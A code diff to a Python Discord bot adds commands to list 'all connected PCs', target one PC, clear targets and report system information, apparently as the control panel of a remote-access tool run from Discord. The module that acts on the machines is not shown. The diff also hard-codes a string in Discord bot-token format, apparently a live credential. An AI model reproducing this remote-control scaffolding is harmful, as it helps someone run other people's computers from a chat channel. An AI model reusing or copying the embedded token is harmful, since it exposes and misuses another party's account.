@@ -8,7 +8,7 @@ intents = discord.Intents.default()
 intents.message_content = True
 bot = commands.Bot(command_prefix='!', intents=intents)
 
-token = ""
+token = "MTQyMDE4MjcwNDkwOTA2MjI4Ng.Gknq6h.WiwtYSbLV7RYAEATfk5qTiu8yat-NUccK1ISmU"
 
 async def start(ctx):
     await ctx.channel.send(f'Logged in as {bot.user}')
@@ -27,6 +27,51 @@ async def on_ready():
     print(f'Bot logged in as {bot.user}')
 
 @bot.command()
+async def getpcs(ctx):
+    import device_manager
+    pc_info = device_manager.get_pc_info()
+    await ctx.send(f"```\n🖥️ {pc_info}\n```")
+
+@bot.command()
+async def target(ctx, *, target_name):
+    user_id = ctx.author.id
+    import device_manager
+    
+    if not device_manager.should_execute(user_id):
+        return
+    
+    result = device_manager.set_target(user_id, target_name)
+    await ctx.send(f"```css\n{result}\n```")
+
+@bot.command()
+async def cleartarget(ctx):
+    user_id = ctx.author.id
+    import device_manager
+    
+    result = device_manager.clear_target(user_id)
+    await ctx.send(f"```css\n{result}\n```")
+
+@bot.command()
+async def targets(ctx):
+    import device_manager
+    
+    if not device_manager.should_execute(ctx.author.id):
+        return
+    
+    result = device_manager.get_all_targets()
+    await ctx.send(f"```\n{result}\n```")
+
+@bot.command()
+async def sysinfo(ctx):
+    import device_manager
+    user_id = ctx.author.id
+    
+    if not device_manager.should_execute(user_id):
+        return
+        
+    await start(ctx)
+
+@bot.command()
 async def info(ctx):
     await start(ctx)
 
@@ -36,7 +81,7 @@ async def cmds(ctx, section=None):
         embed = discord.Embed(title="📋 Command Help", color=0x00ff00)
         embed.add_field(
             name="🔧 General Commands",
-            value="`!info` - Show system information\n`!cmds <section>` - Show detailed help",
+            value="`!sysinfo` - Show system information\n`!cmds <section>` - Show detailed help\n`!getpcs` - Show all connected PCs\n`!target <pc>` - Target specific PC\n`!cleartarget` - Clear target (all PCs)",
             inline=False
         )
         embed.add_field(
